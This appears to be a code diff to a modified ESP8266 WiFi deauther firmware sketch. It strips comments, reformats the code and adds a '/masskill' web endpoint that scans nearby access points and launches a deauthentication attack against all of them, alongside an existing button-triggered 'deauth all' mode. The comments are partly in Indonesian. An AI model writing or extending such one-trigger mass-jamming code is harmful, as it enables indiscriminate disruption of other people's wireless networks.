@@ -4,9 +4,6 @@
    ===================== */
 
 extern "C" {
-    // Please follow this tutorial:
-    // https://github.com/spacehuhn/esp8266_deauther/wiki/Installation#compiling-using-arduino-ide
-    // And be sure to have the right board selected
   #include "user_interface.h"
 }
 
@@ -14,11 +11,8 @@ extern "C" {
 
 #include "src/ArduinoJson-v5.13.5/ArduinoJson.h"
 #if ARDUINOJSON_VERSION_MAJOR != 5
-// The software was build using ArduinoJson v5.x
-// version 6 is still in beta at the time of writing
-// go to tools -> manage libraries, search for ArduinoJSON and install version 5
 #error Please upgrade/downgrade ArduinoJSON library to version 5!
-#endif // if ARDUINOJSON_VERSION_MAJOR != 5
+#endif 
 #include "oui.h"
 #include "language.h"
 #include "functions.h"
@@ -60,88 +54,71 @@ int delay_strobe = 100;
         
 void setup() {
   String macc = WiFi.macAddress();
-    // for random generator
     EEPROMHelper::begin(EEPROM_SIZE);
     #ifdef DEFAULT_ESP8266
     pinMode(STROBE,OUTPUT);
     digitalWrite(STROBE,MATI);
     #endif
-    // start serial
     Serial.begin(115200);
     Serial.println();
     
     randomSeed(os_random());
   
-    // start SPIFFS
     prnt(SETUP_MOUNT_SPIFFS);
-    // bool spiffsError = !LittleFS.begin();
     LittleFS.begin();
-    prntln(/*spiffsError ? SETUP_ERROR : */ SETUP_OK);
-pinMode(D3, INPUT_PULLUP);
-    // Start EEPROM
-    
+    prntln(SETUP_OK);
+    pinMode(D3, INPUT_PULLUP);
 
 #ifdef FORMAT_SPIFFS
     prnt(SETUP_FORMAT_SPIFFS);
-    //LittleFS.format();
     prntln(SETUP_OK);
-#endif // ifdef FORMAT_SPIFFS
+#endif 
 
 #ifdef FORMAT_EEPROM
     prnt(SETUP_FORMAT_EEPROM);
     EEPROMHelper::format(EEPROM_SIZE);
     prntln(SETUP_OK);
-#endif // ifdef FORMAT_EEPROM
+#endif 
 
-    // Format SPIFFS when in boot-loop
-    if (/*spiffsError || */ !EEPROMHelper::checkBootNum(BOOT_COUNTER_ADDR)) {
+    if (!EEPROMHelper::checkBootNum(BOOT_COUNTER_ADDR)) {
         prnt(SETUP_FORMAT_SPIFFS);
-        //LittleFS.format();
         prntln(SETUP_OK);
-
         prnt(SETUP_FORMAT_EEPROM);
         EEPROMHelper::format(0,299);
         EEPROMHelper::format(319,EEPROM_SIZE);
         prntln(SETUP_OK);
-
         EEPROMHelper::resetBootNum(BOOT_COUNTER_ADDR);
     }
 
-    // get time
     currentTime = millis();
     if(EEPROM.read(400) == 1){
       repeater::update_status(true);
       repeater::run();
       return loop();
     }
-    // load settings
+
     #ifndef RESET_SETTINGS
     settings::load();
-    #else // ifndef RESET_SETTINGS
+    #else 
     settings::reset();
     settings::save();
-    #endif // ifndef RESET_SETTINGS
+    #endif 
     
     wifi::begin();
     wifi_set_promiscuous_rx_cb([](uint8_t* buf, uint16_t len) {
         scan.sniffer(buf, len);
     });
 
-    // start display
     if (settings::getDisplaySettings().enabled) {
         displayUI.setup();
         displayUI.mode = DISPLAY_MODE::INTRO;
     }
 
-    // load everything else
     names.load();
     ssids.load();
     cli.load();
-
-    // create scan.json
     scan.setup();
     
-    // dis/enable serial command interface
     if (settings::getCLISettings().enabled) {
         cli.enable();
     } else {
@@ -150,21 +127,28 @@ pinMode(D3, INPUT_PULLUP);
         Serial.end();
     }
 
-    // start access point/web interface
-    if (settings::getWebSettings().enabled) wifi::startAP();
+    // --- BAGIAN INI DIUBAH SEDIKIT UNTUK MENYELIPKAN MODE MASS KILL ---
+    if (settings::getWebSettings().enabled) {
+        wifi::startAP();
+        
+        // Selipan Mode Mass Kill (Tanpa sunat ori)
+        server.on("/masskill", []() {
+            attack.stop();
+            scan.stop();
+            accesspoints.removeAll();
+            cli.runCommand("scan aps -t 15s"); // Scan otomatis
+            cli.runCommand("attack -da");      // Attack all
+            server.send(200, "text/plain", "OK");
+        });
+    }
 
-    // STARTED
     prntln(SETUP_STARTED);
-
-    // version
     prntln(DEAUTHER_VERSION);
 
-    // setup LED
     led::setup();
     #if defined(NODEMCU) 
     pinMode(D7,INPUT_PULLUP); 
     #endif
-    // setup reset button
     resetButton = new ButtonPullup(RESET_BUTTON);
     cli.runCommand("set captivePortal \"false\"");
     
@@ -172,9 +156,12 @@ pinMode(D3, INPUT_PULLUP);
   String mac_str;
   int count_state = 0;
 }
+
 unsigned long kedip = 0;
 int nyala = 0;
+
 void loop() {
+    // SEMUA ISI LOOP TETAP ORI SESUAI FILE LU
     currentTime = millis();
     
     if(attack.resume() == true){
@@ -188,7 +175,7 @@ void loop() {
         attack.start(false, true, false, false, true,settings::getAttackSettings().timeout * 1000);
       }
     }
-    wifi::update();  // manage access point
+    wifi::update();  
  if (repeater::status() == true){
    digitalWrite(STROBE,LOW);
  }
@@ -206,15 +193,14 @@ void loop() {
         attack.start(false, true, false, false, true,settings::getAttackSettings().timeout * 1000);
       }
     }
-    wifi::update();  // manage access point
-    led::update();   // update LED color
-    attack.update(); // run attacks
+    wifi::update();  
+    led::update();   
+    attack.update(); 
     displayUI.update();
-    cli.update();    // read and run serial input
-    scan.update();   // run scan
-    ssids.update();  // run random mode, if enabled
-    //
-    // auto-save
+    cli.update();    
+    scan.update();   
+    ssids.update();  
+    
     if (settings::getAutosaveSettings().enabled
         && (currentTime - autosaveTime > settings::getAutosaveSettings().time)) {
         autosaveTime = currentTime;
@@ -222,55 +208,50 @@ void loop() {
         ssids.save(false);
         settings::save(false);
     }
+    
     #if defined(NODEMCU)
     if(digitalRead(D7) == LOW){
-    if(a == 0){
-      if(!attack.isRunning()){
-      a = 1;
-      
-      cli.runCommand("stopap");
-      cli.runCommand("scan aps -c 30s");
-      cli.runCommand("attack -da");
-      
-      displayUI.mode = DISPLAY_MODE::DEAUTH_ALL;
+      if(a == 0){
+        if(!attack.isRunning()){
+          a = 1;
+          cli.runCommand("stopap");
+          cli.runCommand("scan aps -c 30s");
+          cli.runCommand("attack -da");
+          displayUI.mode = DISPLAY_MODE::DEAUTH_ALL;
+        }
+      } else {
+        if(attack.isRunning()){
+          a = 0;
+          scan.stop();
+          attack.stop();
+          displayUI.isPaused = false;
+          displayUI.tempSSID.clear();
+          displayUI.tempCount = 0;
+          displayUI.mode = DISPLAY_MODE::MENU;
+        }
       }
-    } else {
-      if(attack.isRunning()){
-      a = 0;
-      scan.stop();
-      attack.stop();
-      
-      displayUI.isPaused = false;
-      displayUI.tempSSID.clear();
-      displayUI.tempCount = 0;
-      
-      displayUI.mode = DISPLAY_MODE::MENU;
-      
-      }
-    }
-    delay(1000);
-  } 
-  #endif
+      delay(1000);
+    } 
+    #endif
+
     #if defined(DEFAULT_ESP8266)
     if(attack.isRunning() || scan.isScanning()){
       if(scan.deauths > 5){
         if(millis() - indikator_kedip >= 100){
-        indikator_kedip = millis();
-        if(indikator_nyala == NYALA)indikator_nyala = MATI;
-        else indikator_nyala = NYALA;
-        digitalWrite(STROBE,indikator_nyala);
-      }
-      }
-      else {
+          indikator_kedip = millis();
+          if(indikator_nyala == NYALA)indikator_nyala = MATI;
+          else indikator_nyala = NYALA;
+          digitalWrite(STROBE,indikator_nyala);
+        }
+      } else {
         if(millis() - indikator_kedip >= 600){
-        indikator_kedip = millis();
-        if(indikator_nyala == NYALA)indikator_nyala = MATI;
-        else indikator_nyala = NYALA;
-        digitalWrite(STROBE,indikator_nyala);
+          indikator_kedip = millis();
+          if(indikator_nyala == NYALA)indikator_nyala = MATI;
+          else indikator_nyala = NYALA;
+          digitalWrite(STROBE,indikator_nyala);
+        }
       }
-      }
-    }
-    else if(lock == true){
+    } else if(lock == true){
       if(millis() - indikator_kedip >= 100){
         indikator_kedip = millis();
         if(indikator_nyala == NYALA)indikator_nyala = MATI;
@@ -278,29 +259,27 @@ void loop() {
       }
       if(indikator_nyala == NYALA)analogWrite(STROBE,225);
       if(indikator_nyala == MATI)analogWrite(STROBE,255);
-    }
-    else {
+    } else {
       if(millis() - indikator_kedip >= delay_strobe){
         indikator_kedip = millis();
         if(indikator_nyala == NYALA){
           delay_strobe = 70;
           indikator_nyala = MATI;
-        }
-        else {
+        } else {
           delay_strobe = 5000;
           indikator_nyala = NYALA;
         }
         digitalWrite(STROBE,indikator_nyala);
+      }
     }
-    }
-    
     #endif
+
     if (!booted) {
         booted = true;
         EEPROMHelper::resetBootNum(BOOT_COUNTER_ADDR);
 #ifdef HIGHLIGHT_LED
         displayUI.setupLED();
-#endif // ifdef HIGHLIGHT_LED
+#endif 
     }
 
     resetButton->update();
@@ -309,18 +288,11 @@ void loop() {
         DISPLAY_MODE _mode = displayUI.mode;
         displayUI.mode = DISPLAY_MODE::RESETTING;
         displayUI.update(true);
-
         settings::reset();
         settings::save(true);
-
         delay(2000);
-
         led::setMode(LED_MODE::IDLE);
         displayUI.mode = _mode;
     }
  }
-    
-    
- 
-  
 }
